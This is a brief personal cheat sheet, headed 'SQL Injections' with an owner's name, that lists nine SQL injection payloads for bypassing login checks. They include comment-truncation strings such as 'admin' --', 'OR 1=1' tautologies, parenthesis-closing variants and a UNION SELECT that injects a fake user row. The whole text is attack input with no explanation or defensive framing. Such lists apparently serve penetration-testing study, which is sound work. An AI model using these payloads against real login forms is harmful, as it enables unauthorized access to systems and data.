# SQL Injections

Propietario: Adrian Gisbert Cabello

- `admin' --`
- `admin' #`
- `admin' /*`
- `' OR 1=1;-- -`
- `' OR 1=1#`
- `' OR 1=1/*`
- `') OR '1'='1-- -`
- `') OR ('1'='1-- -`
- `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1-- -`